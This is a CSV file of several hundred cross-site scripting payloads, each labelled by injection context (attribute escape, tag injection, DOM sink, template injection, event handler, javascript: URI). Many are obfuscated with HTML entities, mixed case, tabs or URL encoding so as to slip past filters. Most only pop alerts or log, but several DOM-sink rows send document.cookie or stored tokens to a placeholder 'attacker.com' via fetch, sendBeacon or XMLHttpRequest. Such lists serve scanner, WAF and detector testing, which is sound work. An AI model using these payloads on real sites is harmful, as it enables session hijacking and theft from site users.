payload,context
`><img src=x onscrollsn&#97;pch&#97;ng&#101;=&#97;l&#101;rt('XSS')>,attribute_escape
<seLecT x=y OnsEcuRitYpoLicYviOlaTioN=cOnfIrm(loCatIon.haSh)>,tag_injection
`><Img srC=x onDblCliCk=ConFirM(1)>,attribute_escape
"<maTh
OnpLayIng=coNsoLe.Log('XSS')>",tag_injection
"\' onvolum&#101;ch&#97;ng&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape
%27><img src=x oncut=confirm(%27XSS%27)>,attribute_escape
<xmP sRc=X oNtrAnsItiOneNd=AleRt(LocAtiOn.HasH)>,tag_injection
'><img src=x onpointerdown=\u0061lert(document.domain)>,attribute_escape
<m&#97;rqu&#101;&#101; x=y onscrollsn&#97;pch&#97;ng&#101;=prompt(1)>,tag_injection
' ><svG oNpoIntErdOwn=alErt(doCumEnt.doMaiN)>,attribute_escape
"window[""alert""]('//attacker.com/?c='+document.cookie)",dom_sink
{{aLerT 'XSS'}},template_injection
<liStiNg/OnpOinTerRawUpdAte=alErt('XSS')>,tag_injection
<script>window['alert'](location.hash)</script>,script_injection
"""><form ong&#101;stur&#101;st&#97;rt=consol&#101;.log('XSS')>",tag_injection
<textarea x=y onscrollend=alert(%27XSS%27)>,tag_injection
ontransitionstart=javascript:prompt(location.hash),event_handler
""" onfocusin=console.log(location.hash) """,attribute_escape
"'><img src=x onp&#97;g&#101;sw&#97;p=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
<script/onpoint&#101;rr&#97;wupd&#97;t&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection
"<div/onp&#97;us&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
	onmozfullscreenchange=prompt(%27XSS%27),event_handler
"""><img src=x ons&#101;curitypolicyviol&#97;tion=consol&#101;.log('XSS')>",attribute_escape
%3Cset src=x onclose=confirm(document.domain)%3E,tag_injection
%3Cselect onvolumechange=console.log(1) onvolumechange=console.log(1)%3E,tag_injection
%22 onpaste=confirm(%27XSS%27) %22,attribute_escape
`%3E%3Cimg src=x ontouchend=prompt('XSS')%3E,attribute_escape
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=fEtcH(nAviGatOr.SenDBeAcoN('//aTtaCkeR.cOm',doCumEnt.coOkiE))>"")",dom_sink
%27 onvolumechange=alert(document.domain) %27,attribute_escape
<scr	ipt	>confirm(location.hash)</scr	ipt>,script_injection
""" ><svg onselect=prompt(1)>",attribute_escape
ondrop=consol&#101;.log/**/(docum&#101;nt.dom&#97;in),event_handler
<script>/*/&#97;l&#101;rt(loc&#97;tion.h&#97;sh)</script>,script_injection
__proto__[%22onkeypress%22]=XMLHttpRequest(%27//attacker.com/?c=%27+document.cookie),dom_sink
document.write(%22<img src=x onerror=fetch(document.domain)>%22),dom_sink
%3Cmath/onplaying=console.log('XSS')%3E,tag_injection
__${prompt(%27XSS%27)}__::.x,template_injection
onscrollend=console.log&#40;location.hash&#41;,event_handler
"\"" onpoint&#101;rc&#97;nc&#101;l=prompt(1)//",attribute_escape
document.write(%22<img src=x onerror=console.log(btoa(document.cookie))>%22),dom_sink
' onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=&#97;l&#101;rt('XSS') ',attribute_escape
""" onb&#101;for&#101;cut=confirm(1) """,attribute_escape
<a OnsEarCh=AleRt(1)/>,tag_injection
"\' on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape
\' onk&#101;ypr&#101;ss=&#97;l&#101;rt('XSS')//,attribute_escape
"OnhAshChaNge=jaVasCriPt:ConFirM(STriNg.FroMChArCOde(88,83,83))",event_handler
onwebkittransitionend=alert/***/(%27XSS%27),event_handler
onpageshow=javascr	ipt:alert('XSS'),event_handler
"""><MarQueE oNscRolLsnApcHanGe=ProMpt(1)>",tag_injection
%3Cxss src=x onend=prompt('XSS')%3E,tag_injection
""" ons&#101;curitypolicyviol&#97;tion=consol&#101;.log('XSS') """,attribute_escape
onclick=prompt(%27XSS%27),event_handler
"' ><svg onplaying=alert(String.fromCharCode(88,83,83))>",attribute_escape
"'><Img srC=x onMouSeeNteR=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))>",attribute_escape
"\' OnmOzfUllScrEenChaNge=alErt(StRinG.fRomChaRCoDe(88,83,83))//",attribute_escape
"\"" onrepeat=alert(location.hash)//",attribute_escape
%22><audio onscrollend=prompt(location.hash)>,tag_injection
onkeydown=confirm&#40;location.hash&#41;,event_handler
%22 ><svg onbeforeinput=console.log(%27XSS%27)>,attribute_escape
""" ><svG oNprOmpTacTioN=cOnsOle.loG('XSS')>",attribute_escape
"<script
>console.log(document.domain)</script>",script_injection
 onfocusin=alert(1),event_handler
OndRagOveR=cOnfIrm/*x*/(LocAtiOn.HasH),event_handler
"<script
>prompt(document.domain)</script>",script_injection
""" oNcaNplAy=ConSolE.lOg(LocAtiOn.HasH) """,attribute_escape
%3Caudio onscrollend=prompt(location.hash)%3E,tag_injection
	onMouSeuP=cOnsOle.loG('XSS'),event_handler
""" oNfoCus=prOmpT(1) aUtoFocUs=""",attribute_escape
%3Cscript	%3Ealert(document.domain)%3C/script%3E,script_injection
{php}&#97;l&#101;rt(1){/php},template_injection
"""><details onrepeat=prompt(1)>",tag_injection
onmouseup=console.log&#40;'XSS'&#41;,event_handler
__proto__[%22onmousedown%22]=eval(%27//attacker.com/?c=%27+document.cookie),dom_sink
onscrollsnapchange=confirm(document.domain),event_handler
""" ><svg onkeydown=\u0061lert(location.hash)>",attribute_escape
"\"" onvolum&#101;ch&#97;ng&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape
""" %3E%3Csvg onended=console.log(document.domain)%3E",attribute_escape
%27 onpause=console.log(document.domain) %27,attribute_escape
"WinDow[""cOnfIrm""](LocAlSTorAge.geTItEm('toKen'))",dom_sink
"%3Carea
onended=prompt(String.fromCharCode(88,83,83))%3E",tag_injection
onwebkitfullscreenchange=prompt&#40;1&#41;,event_handler
%22 onsecuritypolicyviolation=console.log(document.domain) %22,attribute_escape
%22 oncopy=console.log(location.hash) %22,attribute_escape
${confirm?new()(%27document.cookie%27)},template_injection
'><Img srC=x onBegIn=ConFirM(1)>,attribute_escape
"<ifr&#97;m&#101;/ontouchst&#97;rt=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
"Object.assign(window,{""ondragover"":fetch})",dom_sink
%3Cmath/oncopy=console.log(document.domain)%3E,tag_injection
"ObjEct.asSigN(wIndOw,{""oNpoIntEroVer"":cOnfIrm})",dom_sink
document.write(%22<img src=x onerror=XMLHttpRequest(%27//attacker.com/?c=%27+document.cookie)>%22),dom_sink
"<body
onbeforecut=confirm(document.domain)>",tag_injection
\' ongotpointercapture=\u0061lert(1)//,attribute_escape
"Object.assign(window,{%22onfullscreenchange%22:fetch})",dom_sink
<!--><&#101;mb&#101;d onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=confirm(loc&#97;tion.h&#97;sh)>,tag_injection
%3Cscript	%3Econsole.log(document.domain)%3C/script%3E,script_injection
<!--><button ondragenter=alert(location.hash)>,tag_injection
' ><svG oNenD=cOnsOle.loG('XSS')>,attribute_escape
"""><img src=x onp&#97;st&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>",attribute_escape
%3Cselect onpromptdismiss=console.log(1)/%3E,tag_injection
`><img src=x onb&#101;for&#101;p&#97;st&#101;=confirm(docum&#101;nt.dom&#97;in)>,attribute_escape
%22><img src=x onscrollsnapchange=alert(1)>,attribute_escape
onsubmit=prompt(docum&#101;nt.dom&#97;in),event_handler
%22 ><svg onmouseenter=alert(location.hash)>,attribute_escape
"""><script onpoint&#101;rr&#97;wupd&#97;t&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>",tag_injection
"\"" onpoint&#101;rov&#101;r=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape
"\"" OnpRomPtdIsmIss=prOmpT(dOcuMenT.dOmaIn)//",attribute_escape
"""><Img srC=x onInpUt=ConFirM(1)>",attribute_escape
%3Cspan	onsecuritypolicyviolation=alert(location.hash)%3E,tag_injection
	onscrollsn&#97;pch&#97;ng&#101;=&#97;l&#101;rt(1),event_handler
"""%3E%3Cimg src=x onbeforecut=confirm(1)%3E",attribute_escape
' ><svG oNseArcH=aLerT('XSS')>,attribute_escape
	onauxclick=confirm(document.domain),event_handler
\%27 onended=console.log(document.domain)//,attribute_escape
' onw&#97;iting=prompt(docum&#101;nt.dom&#97;in) ',attribute_escape
' ><svg onpointermove=confirm(document.domain)>,attribute_escape
%27 onpointerup=alert(1) %27,attribute_escape
"""><noscript onb&#101;for&#101;m&#97;tch=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
<xss src=x ontoggl&#101;=consol&#101;.log('XSS')>,tag_injection
 ontransitionstart=console.log(%27XSS%27),event_handler
<foRm OnwEbkItaNimAtiOneNd=ProMpt('XSS') oNweBkiTanImaTioNenD=pRomPt('XSS')>,tag_injection
" onb&#101;gin=confirm(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
<a src=x onkeypress=confirm(1)>,tag_injection
#{alert(document.cookie)},template_injection
onsearch=javascript:console.log('XSS'),event_handler
"&quot; onanimationiteration=alert(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape
\%27 ontransitionend=prompt(location.hash)//,attribute_escape
"Obj&#101;ct.&#97;ssign(window,{""onmous&#101;ov&#101;r"":consol&#101;.log})",dom_sink
onscrollsnapchange=console.log&#40;location.hash&#41;,event_handler
"\"" on&#97;nim&#97;tion&#101;nd=consol&#101;.log('XSS')//",attribute_escape
<script>Function('confirm(docum&#101;nt.dom&#97;in)')();</script>,script_injection
 onpl&#97;ying=consol&#101;.log(loc&#97;tion.h&#97;sh),event_handler
"""><img src=x onscrollsnapchange=console.log(location.hash)>",attribute_escape
"\' onpoint&#101;rov&#101;r=confirm(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape
"\"" OnpRomPtaCtiOn=ConSolE.lOg('XSS')//",attribute_escape
"\"" onscrollsn&#97;pch&#97;ng&#101;=consol&#101;.log(1)//",attribute_escape
%22 ><svg ontoggle=prompt(1)>,attribute_escape
"\%27 onload=alert(String.fromCharCode(88,83,83))//",attribute_escape
 onFocUsoUt=AleRt('XSS'),event_handler
"\"" OntOggLe=ConSolE.lOg('XSS')//",attribute_escape
javascript:/*-/*`/*\`/*%27/*%22/**/(/* */oNcliCk=console.log(document.domain) )//%0D%0A%0d%0a,js_uri
"(new Function(""prompt('//attacker.com/?c='+document.cookie)""))();",dom_sink
""" onanimationend=confirm(String.fromCharCode(88,83,83)) """,attribute_escape
"__proto__[""onmous&#101;up""]=confirm(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))",dom_sink
"`%3E%3Cimg src=x oninvalid=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape
"<maRquEe	OnbEfoRetOggLe=AleRt(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
document.body.innerHTML=%22<img src=x onerror=eval(document.domain)>%22,dom_sink
"' %3E%3Csvg onstalled=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape
"__proto__[""onanimationcancel""]=\u0061lert(localStorage.getItem('token'))",dom_sink
JavAscRipT:cOnsOle.loG/**/(1),js_uri
"\' onpl&#97;ying=confirm(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape
onanimationend=\u0061lert&#40;1&#41;,event_handler
%3C!--%3E%3Clink oninput=alert(document.domain)%3E,tag_injection
%3C!--%3E%3Cbase onbeforecopy=console.log(location.hash)%3E,tag_injection
"s&#101;tTim&#101;out(""f&#101;tch(String.fromCh&#97;rCod&#101;(88,83,83))"",0)",dom_sink
"\"" onpointerdown=\u0061lert(document.domain)//",attribute_escape
<dialog/onstalled=confirm('XSS')>,tag_injection
"%22><blink onpagehide=confirm(String.fromCharCode(88,83,83))>",tag_injection
"\"" onpaste=confirm(String.fromCharCode(88,83,83))//",attribute_escape
`><Img srC=x onCut=alErt('XSS')>,attribute_escape
<noscript x=y onpaste=confirm(location.hash)>,tag_injection
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=&#97;l&#101;rt(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)>""",dom_sink
"\"" onpointermove=prompt('XSS')//",attribute_escape
%3C!--%3E%3Cdialog onplay=prompt(document.domain)%3E,tag_injection
"' oNbeForEmaTch=prOmpT(STriNg.FroMChArCOde(88,83,83)) '",attribute_escape
"""><Img srC=x onTogGle=alErt(doCumEnt.doMaiN)>",attribute_escape
__proto__[%22onmozfullscreenchange%22]=prompt(localStorage.getItem(%27token%27)),dom_sink
"Object.assign(window,{%22onblur%22:XMLHttpRequest})",dom_sink
"<animatetransform x=y ondragover=console.log(String.fromCharCode(88,83,83))>",tag_injection
"setTimeout(%22alert(localStorage.getItem(%27token%27))%22,0)",dom_sink
onwh&#101;&#101;l=j&#97;v&#97;script:consol&#101;.log(docum&#101;nt.dom&#97;in),event_handler
"document.querySelector(""body"").innerHTML+=""eval(String.fromCharCode(88,83,83))""",dom_sink
"<script>&#97;l&#101;rt`String.fromCh&#97;rCod&#101;(88,83,83)`</script>",script_injection
<&#97;nim&#97;t&#101;/onp&#97;g&#101;show=consol&#101;.log('XSS')>,tag_injection
"\' OngOtpOinTerCapTurE=pRomPt(StrIng.frOmCHarCodE(88,83,83))//",attribute_escape
"<noscript	onbeforematch=confirm(String.fromCharCode(88,83,83))>",tag_injection
&quot; onend=console.log('XSS') x=&quot;,attribute_escape
""" onselect=confirm(String.fromCharCode(88,83,83)) """,attribute_escape
"'><Img srC=x onSelEct=coNfiRm(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape
OndRop=alErt/***/(DocUmeNt.DomAin),event_handler
"element.setAttribute(%22onclick%22,%22fetch(navigator.sendBeacon(%27//attacker.com%27,document.cookie))%22)",dom_sink
"""><img src=x onpl&#97;y=confirm(1)>",attribute_escape
"\"" OnmOusEup=prOmpT(dOcuMenT.dOmaIn)//",attribute_escape
"Object.assign(window,{%22onend%22:XMLHttpRequest})",dom_sink
"""><ObjEct onAniMatIonCanCel=alErt(doCumEnt.doMaiN)>",tag_injection
"ondblclick=prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
onblur=javascr	ipt:console.log(document.domain),event_handler
javascr	ipt:prompt(1),js_uri
%22 ontoggle=console.log(1) %22,attribute_escape
"s&#101;tTim&#101;out(""prompt('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)"",0)",dom_sink
"""><img src=x onpl&#97;y=confirm('XSS')>",attribute_escape
"%22 ><svg onselect=confirm(String.fromCharCode(88,83,83))>",attribute_escape
%3Cblink onkeypress=prompt(document.domain) onkeypress=prompt(document.domain)%3E,tag_injection
	onWebKitFulLscReeNchAngE=aLerT(dOcuMenT.dOmaIn),event_handler
%3Cscript	%3Econfirm(document.domain)%3C/script%3E,script_injection
<object onsubmit=confirm(location.hash)>,tag_injection
'><img src=x onend=console.log('XSS')>,attribute_escape
<!--><MteXt OnsTalLed=coNsoLe.Log(doCumEnt.doMaiN)>,tag_injection
 onmouseenter=prompt(document.domain),event_handler
{php}\u0061lert(1){/php},template_injection
"<xsS
oNenD=pRomPt('XSS')>",tag_injection
""" onplaying=\u0061lert(location.hash) """,attribute_escape
"""><img src=x onscrollsn&#97;pch&#97;ng&#101;=confirm('XSS')>",attribute_escape
window[%22XMLHttpRequest%22](document.domain),dom_sink
"(new Function(""alert(1)""))();",dom_sink
' oNwaItiNg=ProMpt(doCumEnt.doMaiN) ',attribute_escape
"""><xss ontoggl&#101;=consol&#101;.log('XSS')>",tag_injection
%3Ca	onbeforematch=prompt(document.domain)%3E,tag_injection
\' ons&#101;curitypolicyviol&#97;tion=consol&#101;.log('XSS')//,attribute_escape
"<seT
oNcaNplAy=ConFirM(1)>",tag_injection
<auDio onMouSeoVer=coNsoLe.Log('XSS')>,tag_injection
""" ><svg ongotpointercapture=alert(1)>",attribute_escape
document.querySelector(%22body%22).innerHTML+=%22alert(1)%22,dom_sink
"<arEa X=y onEndEd=ProMpt(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection
"oncut=prompt(String.fromCharCode(88,83,83))",event_handler
OnwEbkItaNimAtiOneNd=ConFirM/***/(doCumEnt.doMaiN),event_handler
&quot; ontoggl&#101;=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) x=&quot;,attribute_escape
`><img src=x onfullscreenchange=console.log(1)>,attribute_escape
\%22 onload=console.log(1)//,attribute_escape
"j&#97;v&#97;script:prompt/*x*/(String.fromCh&#97;rCod&#101;(88,83,83))",js_uri
`><Img srC=x onGotPoiNteRcaPtuRe=AleRt(DocUmeNt.DomAin)>,attribute_escape
%27 ><svg ondrop=alert(%27XSS%27)>,attribute_escape
"j&#97;vascript:console.log(String.fromCharCode(88,83,83))",js_uri
`><img src=x ontoggle=console.log(1)>,attribute_escape
""" oNdbLclIck=coNsoLe.Log('XSS') """,attribute_escape
"<embed
onmouseenter=confirm(%27XSS%27)>",tag_injection
"\' onrepeat=confirm(String.fromCharCode(88,83,83))//",attribute_escape
ontr&#97;nsition&#101;nd=&#97;l&#101;rt&#40;loc&#97;tion.h&#97;sh&#41;,event_handler
%22 onerror=console.log(location.hash) %22,attribute_escape
`%3E%3Cimg src=x onpromptdismiss=alert('XSS')%3E,attribute_escape
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=XMLHttpR&#101;qu&#101;st(loc&#97;tion.h&#97;sh)>"")",dom_sink
\' onwh&#101;&#101;l=prompt(loc&#97;tion.h&#97;sh)//,attribute_escape
<seLecT/oNvoLumEchAngE=cOnsOle.loG(1)>,tag_injection
onmozfullscreenchange=prompt&#40;location.hash&#41;,event_handler
%3Cplaintext ontouchstart=alert(1)/%3E,tag_injection
__proto__[%22onpopstate%22]=fetch(location.hash),dom_sink
"%27 onreset=alert(String.fromCharCode(88,83,83)) %27",attribute_escape
"%27 onpointerdown=console.log(String.fromCharCode(88,83,83)) %27",attribute_escape
document.querySelector(%22body%22).innerHTML+=%22fetch(%27//attacker.com/?c=%27+document.cookie)%22,dom_sink
%22 onfocus=confirm(document.domain) autofocus=%22,attribute_escape
' ><svg onpoint&#101;rdown=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,attribute_escape
{{{prompt('XSS')}}},template_injection
%27 ><svg onbeforetoggle=console.log(%27XSS%27)>,attribute_escape
<animatetransform oncontextmenu=prompt(document.domain)>,tag_injection
"' %3E%3Csvg onanimationiteration=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape
"element.setAttribute(%22onclick%22,%22confirm(location.hash)%22)",dom_sink
"Object.assign(window,{%22onwebkittransitionend%22:XMLHttpRequest})",dom_sink
%27><img src=x onauxclick=alert(1)>,attribute_escape
<liStiNg OnwEbkItaNimAtiOneNd=ConSolE.lOg('XSS')/>,tag_injection
onfocusin=confirm&#40;%27XSS%27&#41;,event_handler
"SetTimEouT(""ConSolE.lOg('//AttAckEr.Com/?c='+DocUmeNt.CooKie)"",0)",dom_sink
"EleMenT.sEtATtrIbuTe(""onCliCk"",""cOnsOle.loG('//aTtaCkeR.cOm/?c='+dOcuMenT.cOokIe)"")",dom_sink
"WinDow[""pRomPt""]('XSS')",dom_sink
""" oNprOmpTdiSmiSs=ProMpt(StRinG.fRomChaRCoDe(88,83,83)) """,attribute_escape
<form	onp&#97;g&#101;hid&#101;=confirm(1)>,tag_injection
<!--><vid&#101;o onclick=consol&#101;.log('XSS')>,tag_injection
location.href=%22javascript:XMLHttpRequest(document.cookie+%27&loc=%27+location.href)%22,dom_sink
' onprompt&#97;ction=prompt(loc&#97;tion.h&#97;sh) ',attribute_escape
""" ><svG oNblUr=ProMpt('XSS')>",attribute_escape
%27 onwheel=alert(%27XSS%27) %27,attribute_escape
' ong&#101;stur&#101;st&#97;rt=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) ',attribute_escape
' %3E%3Csvg onbeforecut=confirm(1)%3E,attribute_escape
javascript:console.log/*x*/(location.hash),js_uri
"__proto__[""ondrop""]=&#101;v&#97;l(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))",dom_sink
"%3Cplaintext/onpause=console.log(String.fromCharCode(88,83,83))%3E",tag_injection
%27 ><svg onpageshow=prompt(document.domain)>,attribute_escape
 onWebKitAniMatIonEnd=coNfiRm(DocUmeNt.DomAin),event_handler
'><img src=x ontouchmove=alert(location.hash)>,attribute_escape
<!--><m&#97;rqu&#101;&#101; on&#97;uxclick=confirm(loc&#97;tion.h&#97;sh)>,tag_injection
&quOt; onDraGstArt=coNfiRm(1) X=&QuoT;,attribute_escape
%27><img src=x onbeforecut=console.log(1)>,attribute_escape
"ObjEct.asSigN(wIndOw,{""oNfoCusOut"":aLerT})",dom_sink
<noscript x=y onpointerdown=prompt(document.domain)>,tag_injection
OnpOpsTatE=cOnfIrm&#40;'XSS'&#41;,event_handler
\' OndRagOveR=pRomPt(1)//,attribute_escape
' ons&#101;l&#101;ct=prompt(1) ',attribute_escape
 onpoint&#101;rc&#97;nc&#101;l=consol&#101;.log(1),event_handler
&quOt; onEndEd=ConSolE.lOg(1) X=&QuoT;,attribute_escape
"&#101;v&#97;l(""&#101;v&#97;l(String.fromCh&#97;rCod&#101;(88,83,83))"")",dom_sink
`><img src=x onmous&#101;down=consol&#101;.log('XSS')>,attribute_escape
""" onscrollsnapchange=console.log(1) """,attribute_escape
""" onmouseenter=\u0061lert(document.domain) """,attribute_escape
" onLoaD=pRomPt(StrIng.frOmCHarCodE(88,83,83))",event_handler
`><img src=x ontoggl&#101;=prompt(1)>,attribute_escape
<audio oninput=prompt(location.hash)/>,tag_injection
"__pRotO__[""oNpoPstAte""]=ConSolE.lOg(DocUmeNt.DomAin)",dom_sink
"""><Td OneNd=ConSolE.lOg(DocUmeNt.DomAin)>",tag_injection
"__proto__[""onbeforeinput""]=console.log(document.cookie)",dom_sink
onscrollend=console.log(location.hash),event_handler
ondragenter=prompt/**/(document.domain),event_handler
'><img src=x onpointermove=alert(document.domain)>,attribute_escape
' oNenDed=alErt('XSS') ',attribute_escape
'%3E%3Cimg src=x onpagehide=prompt('XSS')%3E,attribute_escape
javascript:/*-/*`/*\`/*%27/*%22/**/(/* */oNcliCk=prompt(location.hash) )//%0D%0A%0d%0a,js_uri
"<!--><body onfocusout=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
"<foRm
OnrEseT=cOnsOle.loG(dOcuMenT.dOmaIn)>",tag_injection
JAVASCRIPT:aLerT('XSS'),js_uri
OnpOinTerUp=ProMpt&#40;lOcaTioN.hAsh&#41;,event_handler
\%22 onpause=console.log(document.domain)//,attribute_escape
"&quot; onanimationend=confirm(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape
' onwh&#101;&#101;l=&#97;l&#101;rt('XSS') ',attribute_escape
' ><svG oNpaGerEveAl=AleRt(LocAtiOn.HasH)>,attribute_escape
"document.write(""<img src=x onerror=XMLHttpRequest(String.fromCharCode(88,83,83))>"")",dom_sink
\' OntOucHmoVe=ConFirM('XSS')//,attribute_escape
%3Cdialog	onstalled=confirm('XSS')%3E,tag_injection
<base onkeydown=alert(%27XSS%27) onkeydown=alert(%27XSS%27)>,tag_injection
<!--><t&#101;xt&#97;r&#101;&#97; onscroll&#101;nd=&#97;l&#101;rt('XSS')>,tag_injection
"location.href=""javascr	ipt:prompt(navigator.sendBeacon('//attacker.com',document.cookie))""",dom_sink
"Object.assign(window,{""onwheel"":console.log})",dom_sink
%22><img src=x onplay=confirm(document.domain)>,attribute_escape
<arEa OncLosE=pRomPt(1) OncLosE=pRomPt(1)>,tag_injection
"""%3E%3Cimg src=x onended=alert(1)%3E",attribute_escape
"<iframe ongestureend=console.log(String.fromCharCode(88,83,83)) ongestureend=console.log(String.fromCharCode(88,83,83))>",tag_injection
"onb&#101;for&#101;toggl&#101;=j&#97;v&#97;script:confirm(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
OnbEfoRepAstE=cOnfIrm(1),event_handler
#{{prompt(document.domain)}},template_injection
"__pRotO__[""oNmoUseDowN""]=alErt(1)",dom_sink
"<viDeo onPasTe=AleRt(StrIng.frOmCHarCodE(88,83,83))/>",tag_injection
"s&#101;tTim&#101;out(""prompt(1)"",0)",dom_sink
"<div
onp&#97;us&#101;=confirm(loc&#97;tion.h&#97;sh)>",tag_injection
<%= confirm(docum&#101;nt.cooki&#101;) %>,template_injection
	onLoaD=cOnfIrm(doCumEnt.doMaiN),event_handler
onpointermove=javascript:\u0061lert('XSS'),event_handler
""" %3E%3Csvg onclick=prompt('XSS')%3E",attribute_escape
<blink onpopst&#97;t&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)/>,tag_injection
' ontouchmov&#101;=consol&#101;.log('XSS') ',attribute_escape
"Object.assign(window,{%22oncontextmenu%22:eval})",dom_sink
"' ><svg onvolum&#101;ch&#97;ng&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
"onpagereveal=alert&#40;String.fromCharCode(88,83,83)&#41;",event_handler
<form/onwebkitanimationend=prompt('XSS')>,tag_injection
"%22 onreset=console.log(String.fromCharCode(88,83,83)) %22",attribute_escape
"<!--><MarQueE oNprOmpTdiSmiSs=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
"OnpOinTerMovE=pRomPt(StrIng.frOmCHarCodE(88,83,83))",event_handler
' onmous&#101;down=confirm(1) ',attribute_escape
"<scRipT>sEtTImeOut('aLerT(STriNg.FroMChArCOde(88,83,83))',0)</sCriPt>",script_injection
"'%3E%3Cimg src=x onvolumechange=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape
"\"" OnaNimAtiOncAncEl=ConFirM(lOcaTioN.hAsh)//",attribute_escape
"\"" OnwEbkItfUllScrEenChaNge=prOmpT('XSS')//",attribute_escape
%22 ondrop=prompt(%27XSS%27) %22,attribute_escape
%27 onpagehide=alert(location.hash) %27,attribute_escape
\' onbeforetoggle=confirm(location.hash)//,attribute_escape
""" ><svg onpl&#97;y=confirm(1)>",attribute_escape
j&#97;vascr	ipt:confirm('XSS'),js_uri
' onpoint&#101;rdown=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) ',attribute_escape
' ><svG oNprOmpTdiSmiSs=AleRt(DocUmeNt.DomAin)>,attribute_escape
' %3E%3Csvg ondblclick=console.log('XSS')%3E,attribute_escape
""" ><svG oNcoPy=ConSolE.lOg('XSS')>",attribute_escape
__proto__[%22onanimationend%22]=XMLHttpRequest(document.cookie),dom_sink
"%22><img src=x onplay=prompt(String.fromCharCode(88,83,83))>",attribute_escape
`><img src=x onsearch=alert(%27XSS%27)>,attribute_escape
"	onFocUs=ProMpt(StRinG.fRomChaRCoDe(88,83,83))",event_handler
"""><img src=x ontouch&#101;nd=consol&#101;.log('XSS')>",attribute_escape
""" ongotpointercapture=\u0061lert(1) """,attribute_escape
"WinDow[""XMLHTtpReqUesT""](btOa(DocUmeNt.CooKie))",dom_sink
' onh&#97;shch&#97;ng&#101;=&#97;l&#101;rt('XSS') ',attribute_escape
"`><Img srC=x onInvAliD=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape
%22><img src=x onpagereveal=console.log(document.domain)>,attribute_escape
"Obj&#101;ct.&#97;ssign(window,{""onk&#101;ydown"":f&#101;tch})",dom_sink
